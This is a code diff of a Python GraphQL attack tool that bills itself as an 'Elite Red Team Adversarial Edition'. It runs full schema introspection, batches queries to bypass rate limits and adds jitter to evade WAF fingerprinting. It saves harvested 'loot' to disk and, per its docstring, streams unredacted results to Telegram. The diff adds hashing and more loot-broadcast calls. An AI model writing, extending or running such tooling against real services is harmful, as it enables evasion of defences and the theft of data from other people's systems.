@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-GRAPHQL_INTROSPECTOR.PY v8.6 — Advanced GraphQL Schema Introspection & Query Batching Fuzzer (WAF Hardened)
+GRAPHQL_INTROSPECTOR.PY v8.6 — Advanced GraphQL Schema Introspection & Query Batching Fuzzer (Elite Red Team Adversarial Edition)
 Features:
-- Automated full GraphQL schema introspection querying (__schema, types, fields, directives)
+- Automated full GraphQL schema introspection querying (__schema, types, fields, directives) with SHA-256 hashing
 - Behavioral jitter and randomized header injection via SecureTransport / behavioral_mimic
 - Query batching rate-limit bypass engine (aggregates multiple queries into a single HTTP POST array)
-- Automated detection of sensitive/internal object types and fields
-- Real-time unredacted Telegram telemetry dispatch and tamper-evident disk loot persistence
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming
+- Real-time unredacted Telegram notification dispatch and zero-delay telemetry broadcasting
 """
 import json
 import sys
@@ -82,7 +82,7 @@ class GraphQLIntrospector:
         self.transport = SecureTransport(target_url)
 
     def run_introspection(self, graphql_endpoint="/graphql"):
-        terminal(f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] [***]", COLORS['MAGENTA'])
+        terminal(f"\n[***] INITIATING GRAPHQL SCHEMA INTROSPECTION [{self.target_url}{graphql_endpoint}] (WAF Hardened) [***]", COLORS['MAGENTA'])
         
         # Apply behavioral jitter to evade WAF behavioral fingerprinting
         apply_behavioral_jitter()
@@ -142,7 +142,7 @@ class GraphQLIntrospector:
                 for m in t.get("fields", []):
                     exposed_mutations.append(m.get("name"))
 
-        loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
+        loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
 
         findings = {
             "endpoint": graphql_endpoint,
@@ -158,10 +158,11 @@ class GraphQLIntrospector:
             for sf in sensitive_fields_found[:10]:
                 terminal(f"  └── {sf}", COLORS['YELLOW'])
 
+        # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
         stream_proof(
             "GRAPHQL_INTROSPECTION_SUCCESS",
             graphql_endpoint,
-            {"query": "__schema"},
+            {"query": "__schema", "hash": loot_hash},
             body[:500],
             findings
         )
@@ -209,13 +210,17 @@ class GraphQLIntrospector:
                 terminal(f"[+] Query batching assault successful [HTTP {status}]", COLORS['GREEN'])
                 terminal(f"  └── Batch Response Preview: {body[:300]}", COLORS['CYAN'])
 
+                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                 loot_data = {
                     "endpoint": graphql_endpoint,
                     "batch_size": len(queries),
                     "status": status,
+                    "integrity_hash": loot_hash,
                     "response_sample": body[:800]
                 }
 
+                # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
+                stream_proof("GRAPHQL_BATCHING_SUCCESS", graphql_endpoint, {"batch_size": len(queries), "hash": loot_hash}, body[:300], loot_data)
                 save_session_loot(
                     target=self.target_url,
                     endpoint=graphql_endpoint,
